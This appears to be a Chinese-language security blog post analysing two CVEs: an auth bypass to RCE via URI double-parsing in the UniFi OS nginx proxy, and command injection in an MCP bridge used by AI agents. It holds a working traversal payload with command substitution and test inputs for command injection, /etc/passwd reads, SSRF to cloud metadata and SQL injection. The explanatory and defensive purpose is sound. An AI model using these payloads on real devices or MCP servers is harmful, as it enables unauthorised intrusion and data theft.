引言：两个世界的交汇 ⚡

今天的两个漏洞来自完全不同的技术栈，却揭示了同一个趋势：攻击面正在指数级扩张。

一个是传统反向代理架构中的经典设计缺陷——认证网关和路由层各自看"不同版本"的同一URL，导致CVSS 10.0的Pre-Auth RCE，已被Mirai僵尸网络实战利用。另一个是AI Agent时代的全新攻击面——MCP（Model Context Protocol）工具链中的命令注入，开发者误以为"AI内部调用=安全"，结果被传统Web漏洞教做人。

看似无关，实则共享一个底层逻辑：当系统由多个组件协作时，每个组件对"同一个输入"的理解不一致，就是漏洞的温床。🧊✨

CVE-2026-34910：反向代理URI双重解析→认证绕过→RCE 🌐

漏洞概述

UniFi OS（Ubiquiti的网络设备操作系统）的nginx反向代理存在URI双重解析缺陷：认证网关用原始URI判断是否需要认证，而路由层用规范化URI分发请求。攻击者通过编码绕过同时欺骗两个组件。

🔥 CVSS 10.0 | CISA KEV | Mirai僵尸网络实战利用 | 影响所有UniFi OS设备

攻击原理

关键区别于传统的"先检查后归一化"（check-then-normalize）问题。这里是两个独立组件并行使用同一URL的不同版本：

# nginx auth_request 配置（认证网关）
location /api/ {
    auth_request /auth-validate;  # 用 RAW URI 判断
    proxy_pass http://upstream;
}

# 认证网关逻辑：检查URI前缀
if ($request_uri ~ "^/api/auth/validate-sso/") {
    return 200;  # 公开路径，免认证
}

# upstream路由层：用 NORMALIZED URI 分发
# %2f → /, ../ → 路径折叠

Payload构造

# 原始请求URI：
GET /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=$(cmd)

# 认证网关看到的（RAW URI）：
#   前缀 = /api/auth/validate-sso/ → 公开路径 ✅ 免认证

# 路由层看到的（NORMALIZED URI）：
#   %2f解码 → /api/auth/validate-sso/../../../proxy/users/...
#   路径折叠 → /proxy/users/api/v2/ucs/update/latest_package
#   → 内部RCE端点 💀

核心洞察

① 反向代理中的URI不只有"检查→归一化"的顺序问题，还有"两个组件各自看不同版本URI"的并行问题——nginx的auth_request模块和proxy_pass模块是独立配置块，各自独立解析URI。

② 编码绕过≠漏洞绕过：这里攻击者没有绕过任何"安全机制"，而是利用两个组件对同一输入的不同理解。安全检查本身"正常工作"了，只是它检查的不是路由层实际使用的那个版本。

③ 10分漏洞的实战利用速度：CVE公开后Mirai僵尸网络在数小时内就集成了该漏洞——CVSS 10.0 + 0-click + IoT设备 = 完美的僵尸网络招募目标。

审计方法

# 1. 识别认证网关和路由层是否独立解析URI
#    - 发送编码路径（%2f, %2e%2e/, ..%2f）
#    - 对比401/403 vs 200/500的差异

# 2. 构造双重解析payload
#    - 前缀匹配公开路径 + 编码遍历到内部端点
curl -v "https://target/api/public/..%2f..%2fadmin/config"

# 3. 测试各种编码组合
#    %2f = /    %2e = .    %252f = double-encoded /
#    ..;/ = Java path confusion
#    ..%00/ = null byte (older servers)

CVE-2026-19263：MCP工具链命令注入→AI Agent RCE 🤖

漏洞概述

MCP（Model Context Protocol）是AI Agent与外部工具交互的标准协议。mcp-bridge-api作为MCP桥接端点，接受未过滤的command/args参数，直接传递给exec()执行——经典的命令注入。

⚠️ MCP服务器 ≠ "内部安全组件"。它就是普通的HTTP API，和你的REST端点一样需要安全审计。

攻击原理

// MCP Bridge 的危险实现（伪代码）
app.post('/mcp/execute', (req, res) => {
  const { command, args } = req.body;
  // ❌ 直接拼接用户输入到命令
  exec(`${command} ${args.join(' ')}`, (err, stdout) => {
    res.json({ result: stdout });
  });
});

// 攻击者请求
POST /mcp/execute
{
  "command": "ls",
  "args": ["; cat /etc/passwd; #"]
}

// 实际执行: ls ; cat /etc/passwd; #

AI Agent攻击面全景

MCP工具链中的传统Web漏洞：

# MCP攻击面清单（每个tool的每个参数都是攻击向量）

1. 命令注入（CVE-2026-19263）
   - command/args 参数直接拼接exec()
   - 工具名+参数 → shell命令

2. SSRF（CVE-2026-19374）
   - url 参数直接传递给HTTP客户端
   - AI Agent让MCP访问"外部资源" → 实际访问内网

3. 路径穿越
   - file/path 参数未过滤 ../
   - AI Agent让MCP"读取文件" → 读取敏感文件

4. SQL注入
   - query 参数直接拼接SQL
   - AI Agent让MCP"查询数据库" → 数据泄露

审计方法

# 1. 枚举目标AI平台的MCP Server列表
#    - 检查 .mcp.json / mcp-config.yaml
#    - 检查IDE配置（VS Code settings.json中的mcpServers）

# 2. 对每个MCP Server的每个Tool进行传统Web测试
#    - 命令注入: $(whoami), `id`, ; sleep 5
#    - SSRF: http://169.254.169.254/latest/meta-data/
#    - 路径穿越: ../../../etc/passwd
#    - SQL注入: ' OR 1=1--

# 3. 测试MCP Bridge的认证
#    - 直接访问 /mcp/execute 无需token?
#    - 绕过AI Agent直接调用MCP API?

防御建议

# ✅ 正确的MCP工具实现
- 使用参数化命令（spawn而不是exec）
- 对所有输入进行白名单校验
- MCP Server必须有独立的认证机制
- 不要假设"AI Agent调用=可信"
- 网络隔离：MCP Server不应直接访问内网

模式提炼：AI时代的攻击面扩张 🎯

模式一：组件间视角不一致

反向代理URI双重解析的本质是：多个组件对同一输入有不同理解。这不仅限于URI——任何系统中，如果安全检查和业务逻辑使用不同的"数据版本"，就存在绕过可能。

# 视角不一致攻击的通用模式
组件A（安全检查）看到的: 原始输入 X
组件B（业务逻辑）看到的: 转换后的输入 f(X)
攻击目标: 找到 X 使得 A(X)=安全 且 B(X)=恶意

模式二：新协议≠新安全模型

MCP工具链漏洞的核心教训：新协议/新框架不会自带安全性。MCP看起来是"AI内部通信"，但它的API端点和传统REST API面临完全相同的威胁。

# AI时代的安全审计清单
□ MCP Server是否有独立认证？
□ Tool参数是否经过输入验证？
□ MCP Server的网络访问范围是否受限？
□ 是否可以直接绕过Agent调用MCP API？
□ 传统Web漏洞（注入/SSRF/路径穿越）是否覆盖？

综合防御策略

① 统一URI解析：认证网关和路由层必须使用同一个规范化后的URI版本，不要各自独立解析。

② MCP工具链安全审计：把每个MCP Tool当作独立的REST API端点审计，不要被"AI内部调用"的标签迷惑。

③ 零信任组件间通信：任何组件间的"内部调用"都应该有认证和输入验证，不要假设内部=安全。

④ 攻击面可视化：画出完整的请求流图，标注每个组件看到的数据版本——差异之处就是漏洞。
